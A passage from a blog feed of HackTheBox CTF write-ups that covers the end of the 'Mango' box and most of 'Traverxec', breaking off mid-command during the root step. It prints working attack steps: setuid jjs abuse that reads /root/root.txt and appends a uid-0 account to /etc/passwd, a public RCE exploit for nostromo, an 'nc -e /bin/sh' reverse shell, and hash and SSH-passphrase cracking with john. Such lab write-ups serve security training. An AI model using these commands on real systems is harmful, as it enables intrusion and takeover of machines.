src="https://user-images.githubusercontent.com/9076747/68114654-dd511800-fef6-11e9-9f7f-4868af23ac2a.png" alt="incident"></p><p>Maybe the simple <code>su</code> command then ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mango@mango:~$ su - admin</span><br><span class="line">Password:</span><br><span class="line">$ id</span><br><span class="line">uid=4000000000(admin) gid=1001(admin) groups=1001(admin)</span><br><span class="line">$ bash</span><br><span class="line">admin@mango:/$ cat user.txt</span><br><span class="line">7xxxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure><p>Alright that was not that hard was it ? Let’s move on to the root flag.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>One of the first I do while doing recon is to search for binaries with setuid bit enabled first. It’s always an easy way to privilege escalation.</p><p>As a reminder:</p><blockquote><p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span><br></pre></td></tr></table></figure><p>This <code>jjs</code>  binary catch my eye because it’s not common to see it having the setuid bit. If you wonder what <code>jjs</code> stands for, it stands for <strong>J</strong>ava <strong>J</strong>ava<strong>S</strong>cript. </p><h3 id="jjs-setuid-exploitation"><a href="#jjs-setuid-exploitation" class="headerlink" title="jjs setuid exploitation"></a>jjs setuid exploitation</h3><p>Let’s search online to see if we can do something with this <code>jjs</code> binary. My favorite resource is <a href="https://gtfobins.github.io/"><code>GTFOBins</code></a>.</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>According to it, <code>jjs</code> could be used to execute commands, read and write file. Sounds incredibly useful for us especially since the setuid is set meaning the command will be ran as <code>root</code>. </p><p>Let’s give it a try to read the <code>root.txt</code> flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ <span class="built_in">echo</span> <span class="string">&#x27;var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);</span></span><br><span class="line"><span class="string">&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);</span></span><br><span class="line"><span class="string">&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));</span></span><br><span class="line"><span class="string">&gt; while ((line = br.readLine()) != null) &#123; print(line); &#125;&#x27;</span> | jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; var BufferedReader = Java.type(<span class="string">&quot;java.io.BufferedReader&quot;</span>);</span><br><span class="line">jjs&gt; var FileReader = Java.type(<span class="string">&quot;java.io.FileReader&quot;</span>);</span><br><span class="line">jjs&gt; var br = new BufferedReader(new FileReader(<span class="string">&quot;/root/root.txt&quot;</span>));</span><br><span class="line">jjs&gt; <span class="keyword">while</span> ((line = br.readLine()) != null) &#123; <span class="built_in">print</span>(line); &#125;</span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure><p>So we got the root flag! But this not fun enough right ? It would be better to login as root.</p><p>To do so I am going to show an alternative method from the usual SSH key retrieval/adding I usually use. </p><p>This time we are going to add a new root account to the box by adding a new line to the <code>/etc/passwd</code> file. </p><p>First let’s generate the hash of our password: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ openssl passwd -1</span><br><span class="line">Password:</span><br><span class="line">Verifying - Password:</span><br><span class="line">$1$3H6dixbQ<span class="variable">$xxxxxxxxxxxxj7TueW</span>/J.</span><br></pre></td></tr></table></figure><p>We are going to add a new user called <code>hg8</code> with the the uid <code>0</code> (to be root) to the <code>passwd</code> file with the following line:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hg8:$1$3H6dixbQ<span class="variable">$xxxxxxxxxxxxj7TueW</span>/J.:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>Now let’s use the <code>jjs</code> binary to write to <code>/etc/passwd</code> file as root, let’s tweak the example shown on <a href="https://gtfobins.github.io/"><code>GTFOBins</code></a> to append data to a file instead of creating a new one and let’s go:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ jjs</span><br><span class="line">jjs&gt; var FileWriter = Java.type(<span class="string">&quot;java.io.FileWriter&quot;</span>);</span><br><span class="line">jjs&gt; var fw=new FileWriter(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">jjs&gt; fw.write(<span class="string">&quot;hg8:$1$3H6dixbQ<span class="variable">$xxxxxxxxxxxxj7TueW</span>/J.:0:0:root:/root:/bin/bash\n&quot;</span>);</span><br><span class="line">jjs&gt; fw.close();</span><br><span class="line">jjs&gt; </span><br><span class="line">admin@mango:/home/admin$ </span><br></pre></td></tr></table></figure><p>Let’s verify it worked and login as our new user :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin@mango:/$ cat /etc/passwd</span><br><span class="line">[...]</span><br><span class="line">hg8:$1$/k0hFNSh<span class="variable">$HKqgKcpLRBVVv8bY1wfv3</span>.:0:0:root:/root:/bin/bash</span><br><span class="line">admin@mango:/$ su - hg8</span><br><span class="line">Password:</span><br><span class="line">root@mango:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@mango:~<span class="comment"># cat root.txt</span></span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure><p>Now that we are root and done let’s not forget to clean up our changes to not spoil other users!</p><hr><p>As always do not hesitate to contact me for any questions or feedbacks ;)</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> gtfobins </tag>
            
            <tag> mango </tag>
            
            <tag> mongodb </tag>
            
            <tag> nosql injection </tag>
            
            <tag> setuid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Traverxec</title>
      <link href="/posts/traverxec/"/>
      <url>/posts/traverxec/</url>
      
        <content type="html"><![CDATA[<img width="581" alt="traverxec-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158714-d03fb900-9889-11ea-865c-4edee3e92884.png"><p>Traverxec was in my opinion a particular and interesting box. While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook and overthink easy things. Still it was worth cogitate on it! </p><p><strong>Tl;Dr:</strong> The user flag was accessible after using a Remote Code Execution exploit on the <code>nhttpd</code> web server running, giving us access to the <code>www-data</code> user. From here you were able to <em>enter</em> the user home directory and access to a backup archive containing its SSH private key. After brute-forcing the passphrase you could connect to the user account and grab the flag.<br>The root flag consisted in exploiting a misconfiguration in <code>sudo</code> config allowing to view <code>journalctl</code> entries as <code>root</code> without password. Since <code>journalctl</code> use <code>less</code> as a pager it was possible to break out from <code>less</code> running as <code>root</code> by spawning an interactive system shell.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.165 traverxec.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC traverxec.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-18 15:36 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> traverxec.htb (10.10.10.165)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nostromo 1.9.6</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have something super classical: A HTTP (port 80) and SSH (port 22) service open.  </p><p>But in this result something immediately catch the eye : <code>nostromo 1.9.6</code>. That’s a really not common web server.  </p><p>According to its <a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd">documentation</a>: </p><blockquote><p>nhttpd is a simple, fast and secure HTTP server.  It runs as a single<br>process, handling connections with select(2).</p></blockquote><p>And actually while searching for informations about this web server (out of curiosity) the second result on Google was about a RCE vulnerability through directory transversal on version &lt;= 1.9.6 (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16278">CVE-2019-16278</a>).<br>A bash proof-of-concept is also <a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits">available</a>. Seems like we don’t need to search any further…  </p><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ git <span class="built_in">clone</span> https://git.sp0re.sh/sp0re/Nhttpd-exploits.git</span><br><span class="line">Cloning into <span class="string">&#x27;Nhttpd-exploits&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 5, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 5 (delta 0), reused 0 (delta 0)</span><br><span class="line">Unpacking objects: 100% (5/5), <span class="keyword">done</span>.</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">cd</span> Nhttpd-exploits</span><br><span class="line">[hg8@archbook ~]$ bash CVE-2019-16278.sh traverxec.htb 80 id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>That was fast!  </p><p><em>Note: Be careful when launching exploit, do not use CVE-2019-16279.sh since it will DoS the box (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16279">CVE-2019-16279</a>)… It was a very hard box to solve because it would constantly get down probably because of people launching the wrong exploit by mistake.</em></p><p>Let’s now use it to open a reverse shell. First we start our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And launch the exploit :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ bash CVE-2019-16278.sh traverxec.htb 80 <span class="string">&quot;nc -e /bin/sh 10.10.10.10 8585&quot;</span></span><br></pre></td></tr></table></figure><p>We get the connection immediately: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.165:40048</span><br><span class="line">www-data@traverxec:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>First thing first let’s see what the user is to locate the <code>user.txt</code> flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ ls -la /home/</span><br><span class="line">drwx--x--x  6 david david 4096 Nov 19 05:28 david</span><br><span class="line">www-data@traverxec:/$ ls -la /home/david/</span><br><span class="line">ls: cannot open directory <span class="string">&#x27;/home/david/&#x27;</span>: Permission denied</span><br></pre></td></tr></table></figure><p>The user is <code>david</code> but unfortunately we have no rights to read or write files in his home directory. Let’s move on, we might find additional informations later.  </p><h3 id="Pivot-www-data-gt-david"><a href="#Pivot-www-data-gt-david" class="headerlink" title="Pivot www-data -&gt; david"></a>Pivot www-data -&gt; david</h3><p>Looking around we find the configuration of the <code>nostromo</code> web server, hopefully we can find juicy informations there ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/nhttpd.conf</span><br><span class="line"><span class="comment"># MAIN [MANDATORY]</span></span><br><span class="line">servername        traverxec.htb</span><br><span class="line">serverlisten        *</span><br><span class="line">serveradmin        david@traverxec.htb</span><br><span class="line">serverroot        /var/nostromo</span><br><span class="line">servermimes        conf/mimes</span><br><span class="line">docroot            /var/nostromo/htdocs</span><br><span class="line">docindex        index.html</span><br><span class="line"><span class="comment"># LOGS [OPTIONAL]</span></span><br><span class="line">logpid            logs/nhttpd.pid</span><br><span class="line"><span class="comment"># SETUID [RECOMMENDED]</span></span><br><span class="line">user            www-data</span><br><span class="line"><span class="comment"># BASIC AUTHENTICATION [OPTIONAL]</span></span><br><span class="line">htaccess        .htaccess</span><br><span class="line">htpasswd        /var/nostromo/conf/.htpasswd</span><br><span class="line"><span class="comment"># ALIASES [OPTIONAL]</span></span><br><span class="line">/icons            /var/nostromo/icons</span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line">homedirs        /home</span><br><span class="line">homedirs_public        public_www</span><br></pre></td></tr></table></figure><p>The configuration gives the path to an <code>.htpasswd</code> file :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ cat /var/nostromo/conf/.htpasswd</span><br><span class="line">david:$1$e7NfNpNi<span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/</span><br></pre></td></tr></table></figure><p>Maybe if we brute-force the password of this <code>.htpasswd</code> file we can reuse the found password to login as <code>david</code> to ssh. Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;$1$e7NfNpNi<span class="variable">$A6nCwOTqrNR2oDuIKirRZ</span>/&quot;</span> &gt; david.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt david.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Nowonly4me       (?)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Alright! We managed to get the password. That’s a good news and a nice step. Let’s try to login as <code>david</code> now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh david@traverxec.htb</span><br><span class="line">david@traverxec.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br></pre></td></tr></table></figure><p>No luck… <code>su - david</code> maybe ?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ su - david</span><br><span class="line">Password:</span><br><span class="line">su: Authentication failure</span><br><span class="line">www-data@traverxec:/$</span><br></pre></td></tr></table></figure><p>Nop! Looks like a dead end here… Let’s go back at the beginning to make sure we didn’t miss anything. </p><p>First let’s check again the <code>nhttpd.conf</code> file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf</span><br><span class="line">[...]</span><br><span class="line"><span class="comment"># HOMEDIRS [OPTIONAL]</span></span><br><span class="line">homedirs        /home</span><br><span class="line">homedirs_public        public_www</span><br></pre></td></tr></table></figure><p>This <code>HOMEDIRS</code> option catch my eye, does that mean we could access <code>david</code> home directory using the web-server ? Let’s check the documentation:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ man nhttpd</span><br><span class="line">HOMEDIRS</span><br><span class="line">To serve the home directories of your users via HTTP, <span class="built_in">enable</span> the homedirs option by defining the path <span class="keyword">in</span> <span class="built_in">where</span> the home directories are stored, normally /home. To access a users home directory enter a ~ <span class="keyword">in</span> the URL followed by the home directory name like <span class="keyword">in</span> this example:</span><br><span class="line">http://www.nazgul.ch/~hacki/</span><br><span class="line">The content of the home directory is handled exactly the same way as a directory <span class="keyword">in</span> your document root. If some users don<span class="string">&#x27;t want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.</span></span><br><span class="line"><span class="string">You can restrict the access within the home directories to a single sub directory by defining it via the homedirs_public option.</span></span><br></pre></td></tr></table></figure><p>Thats interesting!<br>Ok so we know our user is David, can we access his homedir?</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://traverxec.htb/\~david/</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;&lt;font style=&quot;sans-serif&quot;&gt;</span><br><span class="line">&lt;h1&gt;Private space.&lt;br&gt;Nothing here.</span><br><span class="line">&lt;br&gt;Keep out!&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>“Nothing to see here”… That’s true, and running <code>gobuster</code> won’t help either. We need to find a way to list files and directories in <code>david</code> homedir, but how ? And this is where I got frustrated… After searching for a while I realized I overlooked something obvious. Let’s check again the permissions of <code>david</code> homedir:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ ls -l /home/david/</span><br><span class="line">ls: cannot open directory <span class="string">&#x27;/home/david&#x27;</span>: Permission denied</span><br><span class="line">www-data@traverxec:/$ ls -l /home/</span><br><span class="line">total 4</span><br><span class="line">drwx--x--x 5 david david 4096 Dec 22 12:15 david</span><br></pre></td></tr></table></figure><p>We indeed have no read nor write permissions, but we do have execute bit is set (<code>x</code>).   </p><p>For a binary the <code>x</code> bit mean the file can be executed. But for directory, what does it mean then ? </p><blockquote><p>The execute bit (<code>x</code>) allows the affected user to enter the directory, and access files and directories inside.</p></blockquote><p>So we can not read nor write <code>david</code> homedir but we can enter it! Let’s give a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/$ <span class="built_in">cd</span> /home/david/public_www/</span><br><span class="line"><span class="built_in">cd</span> /home/david/public_www/</span><br><span class="line">www-data@traverxec:/home/david/public_www$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html</span><br><span class="line">drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area</span><br></pre></td></tr></table></figure><p>It worked! Once inside we notice another interesting folder: <code>protected-file-area</code>. Let’s see what’s it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ ls</span><br><span class="line">backup-ssh-identity-files.tgz</span><br></pre></td></tr></table></figure><p>A backup of ssh identity files ? This sure looks promising. Let’s extract it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ mkdir /tmp/.tmp</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ tar -xzf backup-ssh-identity-files.tgz -C /tmp/.tmp</span><br><span class="line">www-data@traverxec:/home/david/public_www/protected-file-area$ <span class="built_in">cd</span> /tmp/.tmp/home/david/</span><br><span class="line">www-data@traverxec:/tmp/tmp/home/david$ ls -la .ssh/</span><br><span class="line">-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 authorized_keys</span><br><span class="line">-rw------- 1 www-data www-data 1766 Oct 25 17:02 id_rsa</span><br><span class="line">-rw-r--r-- 1 www-data www-data  397 Oct 25 17:02 id_rsa.pub</span><br></pre></td></tr></table></figure><p>Jackpot! We can now try to use this ssh key to access <code>david</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa david@traverxec.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:</span><br></pre></td></tr></table></figure><p>It couldn’t have been this easy right? A passphrase is needed for this ssh key. Let’s fire <code>john</code> to see if we can brute-force the passphrase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">hunter           (ssh/id_rsa)</span><br><span class="line">Warning: Only 1 candidate left, minimum 2 needed <span class="keyword">for</span> performance.</span><br><span class="line">1g 0:00:00:12 DONE (2019-11-18 11:06) 0.08012g/s 1149Kp/s 1149Kc/s 1149KC/s *7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p><code>john</code> found <code>hunter</code> as a passphrase. We have all the pieces to login now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa david@traverxec.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:</span><br><span class="line">Linux traverxec 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span></span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7xxxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>First thing first, let’s check what’s inside <code>david</code> home directory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 david david 4096 Dec 22 12:41  bin</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25 15:45  public_www</span><br><span class="line">-r--r----- 1 root  david   33 Oct 25 16:14  user.txt</span><br><span class="line">david@traverxec:~$ ls -l bin</span><br><span class="line">total 8</span><br><span class="line">-r-------- 1 david david 802 Oct 25 16:26 server-stats.head</span><br><span class="line">-rwx------ 1 david david 363 Oct 25 16:26 server-stats.sh</span><br></pre></td></tr></table></figure><p>Let’s first focus on the <code>bin</code> folder and <code>server-stats.sh</code> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">david@traverxec:~/bin$ cat server-stats.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">cat /home/david/bin/server-stats.head</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Load: `/usr/bin/uptime`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Last 5 journal log lines:&quot;</span></span><br><span class="line">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat</span><br></pre></td></tr></table></figure><p>The line about <code>journalctl</code> looks particularly interesting since it’s used with <code>sudo</code> command without password. If we can abuse this <code>journalctl</code> command we can potentially escalate our privileges to root. </p><p>The best resource for finding example of abusing legitimate binaries is <a href="https://gtfobins.github.io/"><code>GTFOBins</code></a>:</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or  maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>According to it, <code>journalctl</code> can be used to elevate privileges thanks to the pager used (<code>less</code>): </p><blockquote><p><code>Less</code> can be used to break out from restricted environments by spawning an interactive system shell.</p></blockquote><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 